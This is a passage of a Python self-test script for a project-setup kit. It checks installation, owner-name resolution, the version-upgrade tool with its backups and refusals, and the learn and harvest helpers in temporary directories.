    r1, o1 = ini(str(G1), "--lang", "en")
    g1 = G1 / ".hermes/plans/GUIDE.md"
    had = g1.is_file()
    (G1 / ".hermes").rename(G1 / ".hermes.off")
    r2, o2 = ini(str(G1), "--lang", "en")
    # init_project.py:180 row 52 (parents=True -> False) SURVIVED: the payload ships .hermes/plans files, so the loop
    # above line 180 recreates .hermes on every install and the mkdir there always finds its parent (measured; SURVIVED-AFTER)
    check("init_project.py plain install (line 178-181): a target that already holds .hermes/plans (one file, no GUIDE.md) and the same target with no .hermes level at all -> exit 0, no Traceback and .hermes/plans/GUIDE.md written both times (the payload loop recreates .hermes before the guide is written)",
          had and r1 == 0 and r2 == 0 and "Traceback" not in o1 + o2 and g1.is_file(), (r1, o1[-200:], r2, o2[-200:]))

    G2 = work / "d3_guide_stage"
    G2.mkdir(parents=True, exist_ok=True)
    ini(str(G2), "--lang", "en")
    g2 = G2 / ".hermes/plans/GUIDE.md"
    put(G2, ".hermes/plans/GUIDE.md", g2.read_bytes() + b"\nEDITED-1\n")
    put(G2, "kit_stage/.hermes/plans/keep.md", "one file the owner already has\n")
    r3, o3 = ini(str(G2), "--lang", "en")
    kd = G2 / "kit_stage/.hermes/plans/GUIDE.md"
    kd3 = kd.is_file()
    (G2 / "kit_stage").rename(G2 / "kit_stage.off")
    put(G2, ".hermes/plans/GUIDE.md", g2.read_bytes() + b"\nEDITED-2\n")
    r4, o4 = ini(str(G2), "--lang", "en")
    # kills init_project.py:187 row 41 (parents=True -> False: FileNotFoundError on the missing kit_stage/.hermes level,
    # reached only when kit_stage/ is absent: the first run keeps the spec's already-present directory)
    check("init_project.py staged branch (line 183-188): an edited .hermes/plans/GUIDE.md with kit_stage/.hermes/plans already there and with no kit_stage at all -> exit 0, no Traceback, kit_stage/.hermes/plans/GUIDE.md written both times (mkdir parents=True; False dies on the missing level)",
          kd3 and r3 == 0 and r4 == 0 and "Traceback" not in o3 + o4 and kd.is_file(), (r3, o3[-200:], r4, o4[-200:]))

    # ================= setup_project.py: the owner order =================
    gname = work / "d3_git_named"
    gname.write_bytes(b"[user]\n\tname = GitName\n\temail = t@e.invalid\n")
    gnone = work / "d3_git_empty"
    gnone.write_bytes(b"")
    sysname = subprocess.run(["git", "config", "user.name"], capture_output=True, text=True,
                             env=dict(os.environ, GIT_CONFIG_GLOBAL=str(gnone))).stdout.strip()
    cases = [("d3_own_git", str(gname), {"USERNAME": "EnvUser", "USER": "EnvUser2"}, "GitName")]
    if sysname:
        print(f"BLOCKED D3-03 b-d: `git config user.name` still returns {sysname!r} with an empty GIT_CONFIG_GLOBAL")
    else:
        cases += [("d3_own_username", str(gnone), {"USERNAME": "EnvUser", "USER": "EnvUser2"}, "EnvUser"),
                  ("d3_own_user", str(gnone), {"USER": "EnvUser2"}, "EnvUser2"),
                  ("d3_own_none", str(gnone), {}, "Owner")]
    got = []
    for dname, gcfg, extra, want in cases:
        d = work / dname
        d.mkdir(parents=True, exist_ok=True)
        e = os.environ.copy()
        e.pop("USERNAME", None)
        e.pop("USER", None)
        e.update(extra)
        e["GIT_CONFIG_GLOBAL"] = gcfg
        r = subprocess.run([py, "-B", SETUP, str(d), dname], cwd=str(d), stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, encoding="utf-8", errors="replace", env=e, timeout=120)
        ag = d / "AGENTS.md"
        txt = ag.read_text(encoding="utf-8", errors="replace") if ag.is_file() else ""
        got.append((want, r.returncode, f"(owner: {want}," in txt))
    # kills setup_project.py:27 rows 13 (or -> and before USER: the USER case names "Owner") and 18 (and between
    # USERNAME and USER: the USERNAME case names USER); the env is os.environ.copy() with the two variables popped
    check("setup_project.py owner order git name, USERNAME, USER, Owner -> the installed AGENTS.md carries (owner: GitName, with a git name, (owner: EnvUser, with only USERNAME, (owner: EnvUser2, with only USER and (owner: Owner, with neither (an `and` in the or-chain names the wrong one)",
          [w for w, _, _ in got][0] == "GitName" and all(rc == 0 and ok for _, rc, ok in got), got)

    # ================= worker_report.py: the arguments reach aw.py =================
    W = new_project(work, "gaps_wr")
    rb, ob = sh([py, "-I", "-B", "tools/worker_report.py", "--bogus"], cwd=W)
    rn, on = sh([py, "-I", "-B", "tools/worker_report.py"], cwd=W)
    rep = W / ".hermes/plans/REPORT_latest.md"
    # kills worker_report.py:6 row 2 (argv[1:] -> argv[2:]: the first argument is dropped, aw.py report runs green)
    check("worker_report.py forwards every argument to aw.py -> `--bogus` comes back as the engine's refusal ('unknown flag --bogus', exit 2) and no argument writes the report ('REPORT written', exit 0); an argv[2:] slice drops the flag and the report runs instead",
          rb == 2 and "unknown flag --bogus" in ob and rn == 0 and "REPORT written" in on and rep.is_file(), (rb, ob, rn, on))

    # ================= init_project.py: exec bits on the installed scripts (POSIX only) =================
    if os.name == "posix":
        EX = work / "d3_exec"
        rex, oex = ini(str(EX), "--lang", "en")
        # payload holds AGENTS.md and tools/ only: the installed tree has no init_project.py, so the name clause of
        # line 174 cannot be seen there (BLOCKED in wk/REPORT.md); tools/kit.env is neither .sh nor .py and must stay plain
        want_x = ("tools/gate.sh", "tools/re_audit.sh", "tools/aw.py")
        bits = {f: (os.stat(EX / f).st_mode & 0o100) for f in want_x if (EX / f).is_file()}
        env_x = os.stat(EX / "tools/kit.env").st_mode & 0o100 if (EX / "tools/kit.env").is_file() else -1
        md_x = os.stat(EX / "AGENTS.md").st_mode & 0o100 if (EX / "AGENTS.md").is_file() else -1
        # kills init_project.py:174 rows 7 (and -> or: every path under tools, tools/kit.env included, gets the bit)
        # and 29 (or -> and: only the three named paths get it, tools/aw.py does not)
        check("init_project.py marks the installed tools/gate.sh, tools/re_audit.sh and tools/aw.py user-executable and leaves tools/kit.env and AGENTS.md alone (the .sh/.py under tools rule; an `or` gives kit.env the bit, an `and` takes it from aw.py)",
              rex == 0 and len(bits) == 3 and all(bits.values()) and not env_x and not md_x, (rex, bits, env_x, md_x))
    else:
        skip("init_project.py exec bits", "Windows has no exec bit: UNMEASURED on Linux and macOS")


def section_shape(work):
    """Reply shape (2.9.0): critical questions and a skipped list; the one-question rule is gone from every prompt copy."""
    arch = (KIT / "payload/.hermes/prompts/ARCHITECT.md").read_text(encoding="utf-8")
    soul = (KIT / "profiles/hermes-architect.SOUL.md").read_text(encoding="utf-8")
    old = re.compile(r"ONE critical question|1-2 closing lines|last 1-2 lines")
    check("reply shape: payload ARCHITECT.md has the `Critical questions (usually 1-3, at most 5)` and `Skipped (no cap)` lines and no one-question rule",
          "Critical questions (usually 1-3, at most 5)" in arch and "Skipped (no cap)" in arch and not old.search(arch))
    check("reply shape: the thin architect SOUL names the critical questions (1-3, at most 5) and the skipped list and has no one-question rule",
          "critical questions (1-3, at most 5" in soul and "skipped list" in soul and not old.search(soul))
    left = [rel for p, rel in kit_files(KIT) if rel.startswith(("payload/", "profiles/")) and p.suffix in (".md", ".py", ".env", ".txt")
            and old.search(p.read_text(encoding="utf-8", errors="replace"))]
    check("reply shape: the old one-question rule is in no file of payload/ or profiles/", not left, left)


def section_upgrade(work):
    """M-06 (2.9.0): upgrade_project.py (u1-u16) and start_plan.cmd / START_PLAN_PROMPT.md (p1-p2); 2.9.1: upgrade_kit.cmd from the kit folder (u17-u18)."""
    CUR = (KIT / "payload/.aw/KIT_VERSION").read_text(encoding="utf-8").strip()
    import hashlib, io, tarfile, zipfile
    UPG = str(KIT / "upgrade_project.py")
    INIT = str(KIT / "init_project.py")
    SETUP = str(KIT / "setup_project.py")
    py = sys.executable
    cfg = work / "upg_gitconfig"
    cfg.write_text("[user]\n\tname = Test\n\temail = t@e.invalid\n", encoding="utf-8", newline="\n")
    genv = {"GIT_CONFIG_GLOBAL": str(cfg)}

    def export_ver(ver, dst):
        shas = subprocess.check_output(["git", "-C", str(KIT), "log", "--format=%h", "--", "payload/.aw/KIT_VERSION"], text=True).split()
        sha = next(h for h in shas if subprocess.check_output(["git", "-C", str(KIT), "show", f"{h}:payload/.aw/KIT_VERSION"], text=True).strip() == ver)
        dst.mkdir(parents=True, exist_ok=True)
        ar = subprocess.run(["git", "-C", str(KIT), "archive", sha], capture_output=True, check=True)
        import io, tarfile
        with tarfile.open(fileobj=io.BytesIO(ar.stdout)) as tf:
            tf.extractall(dst, filter="data")
        return sha

    def make_old(ver, name, crlf=False, commit=True):
        ok = work / f"oldkit_{ver}_{name}"
        if not ok.exists():
            export_ver(ver, ok)
        p = work / f"upg_{name}"
        subprocess.run([py, "-I", "-B", str(ok / "init_project.py"), str(p), "--name", name, "--lang", "bg", "--owner", "Owner"], check=True, capture_output=True)
        if crlf:
            for f in p.rglob("*"):
                if f.is_file():
                    b = f.read_bytes().replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
                    f.write_bytes(b)
        subprocess.run(["git", "-C", str(p), "init", "-q"], check=True, env=genv)
        if commit:
            subprocess.run(["git", "-C", str(p), "add", "-A"], check=True, env=genv)
            subprocess.run(["git", "-C", str(p), "-c", "user.name=T", "-c", "user.email=t@e", "commit", "-q", "-m", "init"], check=True, env=genv)
        return p

    def tree_sha(root):
        h = hashlib.sha256()
        for f in sorted((x for x in root.rglob("*") if x.is_file() and ".git" not in x.parts), key=lambda x: x.relative_to(root).as_posix()):
            h.update(f.relative_to(root).as_posix().encode() + b"\0" + hashlib.sha256(f.read_bytes()).digest())
        return h.hexdigest()

    hist = subprocess.check_output(["git", "-C", str(KIT), "log", "-p", "--format=", "--", "payload/.aw/KIT_VERSION"], text=True)
    OLDV = "2.6.4" if "+2.6.4" in hist else min(re.findall(r"^\+(2\.\d+\.\d+)$", hist, re.M), key=lambda v: tuple(map(int, v.split("."))))  # a public copy has a shorter history
    P1 = make_old(OLDV, "u_main")
    # Customize kit.env and STATE files to verify u5 and u6
    ke0 = (P1 / "tools/kit.env").read_text(encoding="utf-8")
    ke0 = re.sub(r"(?m)^TEST_CMD=.*$", "TEST_CMD=python3 -m unittest discover -s custom_tests", ke0)
    ke0 = re.sub(r"(?m)^COUNT_REGEX=.*$", lambda _: "COUNT_REGEX=Ran ([0-9]+) custom", ke0)
    (P1 / "tools/kit.env").write_text(ke0, encoding="utf-8", newline="\n")
    (P1 / ".hermes/plans/WORKLOG.md").write_text("# custom worklog\n", encoding="utf-8", newline="\n")
    (P1 / ".aw/ratchet.json").write_text('{"min_tests": 42}\n', encoding="utf-8", newline="\n")
    # Customize one engine file (findings_lint.py) to test u3 LOCAL, remove review_pack.py to test u4 ADD
    (P1 / "tools/findings_lint.py").write_bytes((P1 / "tools/findings_lint.py").read_bytes() + b"\n# local patch\n")
    local_bytes = (P1 / "tools/findings_lint.py").read_bytes()
    (P1 / "tools/review_pack.py").rename(P1 / "tools/review_pack.py.off")
    if (P1 / "tools/effort.py").is_file():  # 2.8.0 and later ship it: take it away so u4 still proves ADD
        (P1 / "tools/effort.py").rename(P1 / "tools/effort.py.off")
    # Add START_ARCHITECT.cmd with local edit to test u16 LOCAL launcher
    (P1 / "START_ARCHITECT.cmd").write_text("@echo off\nrem local launcher\n", encoding="utf-8", newline="\n")
    old_aw_bytes = (P1 / "tools/aw.py").read_bytes()
    old_ke_bytes = (P1 / "tools/kit.env").read_bytes()
    state_before = {rel: (P1 / rel).read_bytes() for rel in (".hermes/plans/WORKLOG.md", ".hermes/plans/PLAN_latest.md", ".hermes/plans/AUDIT_LEDGER.md", ".aw/ratchet.json", ".aw/frozen.txt")}

    # u1: dry-run writes nothing
    sha0 = tree_sha(P1)
    rc_dry, out_dry = sh([py, "-I", "-B", UPG, str(P1)])
    check("u1 upgrade_project.py dry-run writes nothing (tree sha before == after) and prints KIT-UPGRADE PLAN",
          rc_dry == 0 and tree_sha(P1) == sha0 and f"KIT-UPGRADE PLAN from={OLDV} to={CUR}" in out_dry, out_dry[-300:])

    # u15: init_project.py --check before apply prints ENV missing_keys= and LAUNCHER missing= before KIT-CHECK
    rc_chk0, out_chk0 = sh([py, "-I", "-B", INIT, "--check", str(P1)])
    chk0_lines = [x.strip() for x in out_chk0.strip().splitlines() if not x.startswith("FIX:")]
    check("u15 init_project.py --check prints ENV missing_keys=<n> and LAUNCHER missing=<n> right before the unchanged last KIT-CHECK line",
          rc_chk0 == 1 and len(chk0_lines) >= 3 and chk0_lines[-3].startswith("ENV missing_keys=%d" % (7 if OLDV == "2.6.4" else 4))
          and chk0_lines[-2].startswith("LAUNCHER missing=3") and chk0_lines[-1].startswith("KIT-CHECK engine_same="), chk0_lines[-4:])

    # Apply upgrade on P1
    rc_ap, out_ap = sh([py, "-I", "-B", UPG, str(P1), "--apply"])
    # u2: REPLACE on equal old render
    check("u2 upgrade_project.py --apply replaces untouched old engine files (REPLACE tools/aw.py, .hermes/prompts/ARCHITECT.md)",
          rc_ap == 0 and "REPLACE tools/aw.py" in out_ap and (P1 / "tools/aw.py").read_bytes() == (KIT / "payload/tools/aw.py").read_bytes()
          and "Owner" in (P1 / ".hermes/prompts/ARCHITECT.md").read_text(encoding="utf-8"), out_ap[-300:])
    # u3: LOCAL engine file untouched + staged in kit_stage/
    check("u3 LOCAL engine file is untouched and the new version is staged in kit_stage/",
          "LOCAL tools/findings_lint.py" in out_ap and (P1 / "tools/findings_lint.py").read_bytes() == local_bytes
          and (P1 / "kit_stage/tools/findings_lint.py").read_bytes() == (KIT / "payload/tools/findings_lint.py").read_bytes(), out_ap[-300:])
    # u4: ADD missing engine tool
    check("u4 ADD installs missing engine tools (tools/effort.py, tools/review_pack.py)",
          "ADD tools/effort.py" in out_ap and "ADD tools/review_pack.py" in out_ap
          and (P1 / "tools/effort.py").read_bytes() == (KIT / "payload/tools/effort.py").read_bytes()
          and (P1 / "tools/review_pack.py").read_bytes() == (KIT / "payload/tools/review_pack.py").read_bytes(), out_ap[-300:])
    # u5: kit.env new keys added, existing lines byte-for-byte
    ke1 = (P1 / "tools/kit.env").read_bytes()
    ke1_txt = ke1.decode("utf-8")
    check("u5 tools/kit.env gets the missing keys while existing lines (PROJECT_NAME, TEST_CMD, COUNT_REGEX) stay byte-for-byte",
          ke1.startswith(old_ke_bytes) and "TEST_CMD=python3 -m unittest discover -s custom_tests\n" in ke1_txt
          and "COUNT_REGEX=Ran ([0-9]+) custom\n" in ke1_txt and "PROJECT_NAME=u_main\n" in ke1_txt
          and all(f"\n{k}=" in ke1_txt for k in ("EFFORT_DEFAULT", "EFFORT_HARD", "EFFORT_WORKER", "OWNER", "REPLY_LANG", "KIT_HOME", "MODEL_PLAN")), ke1_txt[-300:])
    # u6: STATE files untouched
    check("u6 STATE files (WORKLOG, PLAN_latest, AUDIT_LEDGER, ratchet.json, frozen.txt) are untouched byte-for-byte",
          all((P1 / rel).read_bytes() == b for rel, b in state_before.items()))
    # u8: backup zip holds old bytes of replaced files and kit.env
    zfiles = list((P1 / ".hermes/plans/backups").glob(f"KIT-{OLDV}-*.zip"))
    z_aw, z_ke = (zipfile.ZipFile(zfiles[0]).read("tools/aw.py"), zipfile.ZipFile(zfiles[0]).read("tools/kit.env")) if zfiles else (b"", b"")
    check("u8 backup zip in .hermes/plans/backups/KIT-<old>-<date>.zip holds the old bytes of replaced files and tools/kit.env",
          len(zfiles) == 1 and z_aw == old_aw_bytes and z_ke == old_ke_bytes, [z.name for z in zfiles])
    # u9: second --apply prints zeros
    rc_ap2, out_ap2 = sh([py, "-I", "-B", UPG, str(P1), "--apply"])
    check("u9 second --apply is idempotent (replace=0 add=0 keys=0)",
          rc_ap2 == 0 and "replace=0 add=0 local=2 keys=0" in out_ap2, out_ap2[-200:])
    # u13: no '{{' in any written file
    leftover_ph = [f.relative_to(P1).as_posix() for f in P1.rglob("*") if f.is_file() and ".git" not in f.parts and re.search(rb"\{\{[A-Z_][A-Z0-9_]*\}\}", f.read_bytes())]
    check("u13 no written file in the upgraded project contains an unfilled '{{' placeholder", not leftover_ph, leftover_ph)
    # u14: .aw/KIT_VERSION is ordered last in the action list and holds the kit version
    act_lines = [ln for ln in out_ap.splitlines() if ln.startswith(("REPLACE ", "ADD ", "LOCAL ", "SAME "))]
    check("u14 .aw/KIT_VERSION is processed last and updated to the kit version",
          bool(act_lines) and act_lines[-1].endswith(" .aw/KIT_VERSION") and (P1 / ".aw/KIT_VERSION").read_text(encoding="utf-8").strip() == CUR, act_lines[-3:])
    # u16: launchers ADD and LOCAL
    check("u16 launchers: missing START_PLAN.cmd/START_WORKER.cmd/UPGRADE_KIT.cmd are ADDed, edited START_ARCHITECT.cmd is LOCAL + staged",
          "ADD START_PLAN.cmd" in out_ap and "ADD START_WORKER.cmd" in out_ap and "ADD UPGRADE_KIT.cmd" in out_ap
          and "LOCAL START_ARCHITECT.cmd" in out_ap and (P1 / "kit_stage/START_ARCHITECT.cmd").is_file()
          and (P1 / "START_PLAN.cmd").is_file() and (P1 / "UPGRADE_KIT.cmd").is_file(), out_ap[-300:])

    # u17, u18 (2.9.1): a 2.8.4-or-older project has no UPGRADE_KIT.cmd yet, so the kit's own upgrade_kit.cmd takes the project folder as %1
    if os.name == "nt":
        e_dd = {k: v for k, v in os.environ.items() if k != "AW_KIT_HOME"}
        Pdd = make_old("2.8.4", "u_drag")
        r_dd = subprocess.run(["cmd", "/c", str(KIT / "upgrade_kit.cmd"), str(Pdd)], stdin=subprocess.DEVNULL, capture_output=True, text=True,
                              encoding="utf-8", errors="replace", timeout=300, env=e_dd)
        check("u17 upgrade_kit.cmd in the kit folder upgrades the project folder dragged onto it (%1): dry-run, then --apply, KIT_VERSION = the kit's",
              "KIT-UPGRADE PLAN from=2.8.4" in r_dd.stdout and "KIT-UPGRADE DONE from=2.8.4" in r_dd.stdout
              and (Pdd / ".aw/KIT_VERSION").read_text(encoding="utf-8").strip() == CUR and (Pdd / "UPGRADE_KIT.cmd").is_file(), (r_dd.returncode, r_dd.stdout[-400:]))
        r_00 = subprocess.run(["cmd", "/c", str(KIT / "upgrade_kit.cmd")], stdin=subprocess.DEVNULL, capture_output=True, text=True,
                              encoding="utf-8", errors="replace", timeout=60, env=e_dd)
        check("u18 upgrade_kit.cmd double-clicked in the kit folder (no project folder) says to drag the project folder onto it and exits 1",
              r_00.returncode == 1 and "drag the project folder onto upgrade_kit.cmd" in r_00.stdout and "KIT-UPGRADE" not in r_00.stdout, r_00.stdout[-300:])
    else:
        skip("u17 upgrade_kit.cmd drag-and-drop", "cmd.exe exists only on Windows")
        skip("u18 upgrade_kit.cmd without a project folder", "cmd.exe exists only on Windows")

    bare = [f"{c.name}:{i}" for c in sorted(KIT.glob("*.cmd")) for i, ln in enumerate(c.read_text(encoding="utf-8", errors="replace").splitlines(), 1)
            if re.match(r"\s*%PY%\s", ln)]
    check("u19 every %PY% line of the kit launchers starts with `call` (a python.cmd shim first on PATH ends a batch file that runs it bare: measured, u17 stopped after the dry-run)",
          not bare, bare)

    # u7: CRLF project stays CRLF
    Pcrlf = make_old("2.8.1", "u_crlf", crlf=True)
    rc_c, out_c = sh([py, "-I", "-B", UPG, str(Pcrlf), "--apply"])
    aw_crlf = (Pcrlf / "tools/aw.py").read_bytes()
    ke_crlf = (Pcrlf / "tools/kit.env").read_bytes()
    check("u7 CRLF project stays CRLF across replaced files, added files and tools/kit.env",
          rc_c == 0 and b"\r\n" in aw_crlf and b"\n" not in aw_crlf.replace(b"\r\n", b"")
          and b"\r\n" in ke_crlf and b"\n" not in ke_crlf.replace(b"\r\n", b""), out_c[-200:])

    # u10, u11, u12: the three refusals (no commit, unknown version, newer target)
    P_nocommit = make_old("2.8.1", "u_nocommit", commit=False)
    sha_nc = tree_sha(P_nocommit)
    r10, o10 = sh([py, "-I", "-B", UPG, str(P_nocommit), "--apply"])
    check("u10 refuses a target with no git commit (exit 2, REFUSED:, nothing written)",
          r10 == 2 and "REFUSED:" in o10 and tree_sha(P_nocommit) == sha_nc, o10)

    P_unk = make_old("2.8.1", "u_unk")
    (P_unk / ".aw/KIT_VERSION").write_text("2.0.1\n", encoding="utf-8", newline="\n")
    sha_uk = tree_sha(P_unk)
    r11, o11 = sh([py, "-I", "-B", UPG, str(P_unk), "--apply"])
    check("u11 refuses a target whose KIT_VERSION is not in git history (exit 2, REFUSED:, nothing written)",
          r11 == 2 and "REFUSED:" in o11 and "not in the kit's git history" in o11 and tree_sha(P_unk) == sha_uk, o11)

    P_new = make_old("2.8.4", "u_newer")
    (P_new / ".aw/KIT_VERSION").write_text("9.9.9\n", encoding="utf-8", newline="\n")
    sha_nw = tree_sha(P_new)
    r12, o12 = sh([py, "-I", "-B", UPG, str(P_new), "--apply"])
    check("u12 refuses a target newer than the kit (exit 2, REFUSED:, nothing written)",
          r12 == 2 and "REFUSED:" in o12 and "is newer than kit" in o12 and tree_sha(P_new) == sha_nw, o12)

    # p2: setup_project.py installs START_PLAN.cmd, UPGRADE_KIT.cmd and START_PLAN_PROMPT.md (forbidding cards)
    SP = work / "setup_plan_test"
    SP.mkdir(parents=True, exist_ok=True)
    rc_sp, out_sp = sh([py, "-B", SETUP, str(SP), "setup_plan_test"], cwd=SP, env=genv)
    spp = SP / ".hermes/START_PLAN_PROMPT.md"
    spp_txt = spp.read_text(encoding="utf-8") if spp.is_file() else ""
    check("p2 setup_project.py installs START_PLAN.cmd, UPGRADE_KIT.cmd and .hermes/START_PLAN_PROMPT.md (which forbids writing cards/queues and points to START_ARCHITECT.cmd)",
          rc_sp == 0 and (SP / "START_PLAN.cmd").is_file() and (SP / "UPGRADE_KIT.cmd").is_file()
          and spp.is_file() and "Never write a task card" in spp_txt and "START_ARCHITECT.cmd" in spp_txt, (rc_sp, spp_txt[:200]))

    # p1: start_plan.cmd passes -m from MODEL_PLAN, and when empty falls back to default model
    fbin = work / "fakebin_plan"
    fbin.mkdir(exist_ok=True)
    (fbin / "hermes.cmd").write_bytes(b'@echo off\r\n>"%AW_FAKE_OUT%" echo %*\r\n')
    path_ = str(fbin) + os.pathsep + str(Path(py).parent) + os.pathsep + os.environ.get("PATH", "")
    fout = work / "fake_plan_out.txt"
    def run_plan_cmd(extra=None):
        fout_i = work / f"fake_plan_{len(os.listdir(work))}.txt"
        e_ = {k_: v_ for k_, v_ in os.environ.items() if not k_.startswith("AW_")}
        e_.update({"PATH": path_, "AW_FAKE_OUT": str(fout_i)})
        e_.update(extra or {})
        subprocess.run(["cmd", "/c", "START_PLAN.cmd"], cwd=str(SP), env=e_, stdin=subprocess.DEVNULL, capture_output=True, timeout=60)
        return fout_i.read_text(encoding="utf-8", errors="replace").strip() if fout_i.exists() else ""
    p_def = run_plan_cmd()
    ke_sp = (SP / "tools/kit.env").read_text(encoding="utf-8")
    (SP / "tools/kit.env").write_text(ke_sp.replace("MODEL_PLAN=", "MODEL_PLAN=claude-opus-5-5"), encoding="utf-8", newline="\n")
    p_set = run_plan_cmd()
    check("p1 START_PLAN.cmd passes -m from MODEL_PLAN in tools/kit.env (claude-opus-5-5), and when MODEL_PLAN is empty falls back to the default model (claude-sonnet-5-5)",
          "-m claude-sonnet-5-5" in p_def and "START_PLAN_PROMPT.md" in p_def
          and "-m claude-opus-5-5" in p_set and "START_PLAN_PROMPT.md" in p_set, (p_def, p_set))


def section_learn(work):
    """M-07 (2.9.0): learn.py kit-behind / stale-proposal (l1-l3) and dev/harvest.py (h1-h4)."""
    import hashlib
    LRN, HRV, py = KIT / "payload/tools/learn.py", str(KIT / "dev/harvest.py"), sys.executable

    def proj(name, ver="2.8.4", kit_home=None, proposals=(), metrics=(), learn=True):
        p = work / f"lrn_{name}"
        (p / ".aw").mkdir(parents=True, exist_ok=True)
        (p / ".hermes/plans").mkdir(parents=True, exist_ok=True)
        (p / "tools").mkdir(parents=True, exist_ok=True)
        (p / ".aw/KIT_VERSION").write_text(ver + "\n", encoding="utf-8", newline="\n")
        (p / "tools/kit.env").write_text("TEST_CMD=x\n" + (f"KIT_HOME={kit_home}\n" if kit_home else ""), encoding="utf-8", newline="\n")
        (p / ".hermes/plans/PROPOSALS.md").write_text("| ID | Date | Proposal | Closes | Owner | Status | Evidence |\n|---|---|---|---|---|---|---|\n"
                                                      + "".join(f"| {i} | {d} | a check | - | Architect | {s} | x |\n" for i, d, s in proposals), encoding="utf-8", newline="\n")
        (p / ".hermes/plans/METRICS.md").write_text("| Date | Type |\n|---|---|\n" + "".join(f"| {d} | queue |\n" for d in metrics), encoding="utf-8", newline="\n")
        if learn:
            shutil.copy(LRN, p / "tools/learn.py")
        return p

    def learn(p):
        r = subprocess.run([py, "-I", "-B", str(LRN), str(p)], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=120)
        return r.returncode, r.stdout

    kit = work / "lrn_kit"
    (kit / "payload/.aw").mkdir(parents=True, exist_ok=True)
    (kit / "payload/.aw/KIT_VERSION").write_text("2.9.0\n", encoding="utf-8", newline="\n")
    rc_b, o_b = learn(proj("behind", kit_home=kit.as_posix()))
    rc_s, o_s = learn(proj("same", ver="2.9.0", kit_home=kit.as_posix()))
    check("l1 learn.py: kit-behind fires when .aw/KIT_VERSION (2.8.4) < KIT_HOME/payload/.aw/KIT_VERSION (2.9.0) and names UPGRADE_KIT.cmd; an equal version is silent",
          rc_b == 0 and "LEARN SUGGEST kit-behind | .aw/KIT_VERSION 2.8.4 < 2.9.0" in o_b and "UPGRADE_KIT.cmd" in o_b
          and rc_s == 0 and "kit-behind" not in o_s, (o_b, o_s))
    rc_n, o_n = learn(proj("nokey"))
    rc_g, o_g = learn(proj("gone", kit_home=(work / "no_such_kit").as_posix()))
    check("l2 learn.py: no KIT_HOME key, or a KIT_HOME path that does not exist, is silent and does not crash (exit 0, no kit-behind)",
          rc_n == 0 and rc_g == 0 and "kit-behind" not in o_n + o_g and "Traceback" not in o_n + o_g, (o_n, o_g))
    rc_3, o_3 = learn(proj("stale3", proposals=[("P-01", "2026-01-01", "PROPOSED"), ("P-02", "2026-01-01", "VERIFIED")],
                           metrics=["2026-01-01", "2026-01-02", "2026-01-03", "2026-01-04"]))
    rc_2, o_2 = learn(proj("stale2", proposals=[("P-01", "2026-01-01", "PROPOSED")], metrics=["2026-01-01", "2026-01-02", "2026-01-03"]))
    check("l3 learn.py: stale-proposal fires for a PROPOSED row with 3 later METRICS rows (cites PROPOSALS.md:3, a VERIFIED row and a same-day row do not count) and is silent at 2 later rows",
          "LEARN SUGGEST stale-proposal | P-01 PROPOSED since 2026-01-01, 3 later METRICS rows, PROPOSALS.md:3" in o_3 and "P-02" not in o_3
          and "stale-proposal" not in o_2, (o_3, o_2))

    def tree_sha(p):
        h = hashlib.sha256()
        for f in sorted(x for x in p.rglob("*") if x.is_file()):
            h.update(f.relative_to(p).as_posix().encode() + b"\0" + f.read_bytes())
        return h.hexdigest()
    a = proj("ha", kit_home=kit.as_posix(), proposals=[("P-01", "2026-01-01", "PROPOSED")])
    b = proj("hb", kit_home=kit.as_posix())
    c = proj("hc", learn=False)
    before = [tree_sha(x) for x in (a, b, c)]
    r = subprocess.run([py, "-I", "-B", HRV, str(a), str(b), str(c)], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=300)
    out = r.stdout.splitlines()
    check("h1 harvest.py writes nothing in the projects it reads (tree sha before == after for all three)",
          r.returncode == 0 and [tree_sha(x) for x in (a, b, c)] == before, r.stdout + r.stderr)
    check("h2 harvest.py: a family met in 2 projects is cross_project (kit-behind in lrn_ha and lrn_hb), one met once is not (proposed)",
          "CROSS kit-behind projects=2" in out and not any(x.startswith("CROSS proposed") for x in out)
          and "CANDIDATE lrn_ha:PROPOSALS.md:3 proposed | P-01 a check" in out, out)
    check("h3 harvest.py: a project without tools/learn.py is `SKIP <name> no tools/learn.py`, not a crash",
          "SKIP lrn_hc no tools/learn.py" in out and "Traceback" not in r.stderr, (out, r.stderr))
    check("h4 harvest.py: the last line is `HARVEST projects=2 suggestions=3 families=2 cross_project=1`",
          bool(out) and out[-1] == "HARVEST projects=2 suggestions=3 families=2 cross_project=1", out[-3:])


def main() -> int:
    t0 = time.time()
    given = len(sys.argv) > 1 and not sys.argv[1].startswith("-")
    work = Path(sys.argv[1]).resolve() if given else Path(tempfile.mkdtemp(prefix="awkit_selftest_"))
    scratch = None if given else work   # only a dir this run made is this run's to remove
    work.mkdir(parents=True, exist_ok=True)
    print(f"awkit selftest | kit={KIT} | python={sys.version.split()[0]} | bash={BASH or 'NONE'} | work={work}")
    if "--lint-only" in sys.argv:
        section_lint(work)
        return finish(t0, scratch)
    P = new_project(work, "proj")
    assert P.name == "proj"  # v2: every later section reuses P, so it must not be rebound
    check("init installs", (P / "tools/aw.py").is_file() and (P / ".aw/KIT_VERSION").is_file())
    before = (P / "tools/kit.env").read_bytes()
    r2 = subprocess.run([sys.executable, str(KIT / "init_project.py"), str(P)], capture_output=True, text=True, encoding="utf-8")
    check("re-init never overwrites (collisions go to kit_stage)",
          (P / "tools/kit.env").read_bytes() == before and "COLLISION" in r2.stdout and (P / "kit_stage/tools/kit.env").is_file(), r2.stdout)

    # ---- v2: init flags + --check
    Q = work / "lang"
    r = subprocess.run([sys.executable, str(KIT / "init_project.py"), str(Q), "--name", "LangProj", "--lang", "bg", "--owner", "the owner"],
                       capture_output=True, text=True, encoding="utf-8")
    g = (Q / ".hermes/plans/GUIDE.md").read_text(encoding="utf-8", errors="replace")
    envq = (Q / "tools/kit.env").read_text(encoding="utf-8")
    check("init --lang bg --owner: GUIDE.md is the Bulgarian guide and REPLY_LANG set",
          r.returncode == 0 and "РЪКОВОДСТВО" in g and "{{OWNER}}" not in envq, r.stdout + g[:80])
    r = subprocess.run([sys.executable, str(KIT / "init_project.py"), "--check", str(Q)], capture_output=True, text=True, encoding="utf-8")
    check("init --check: fresh install -> engine_diff=0 missing=0", r.returncode == 0 and "engine_diff=0 missing=0" in r.stdout, r.stdout[-400:])
    (Q / "tools/aw.py").write_bytes((Q / "tools/aw.py").read_bytes() + b"\n# drift\n")
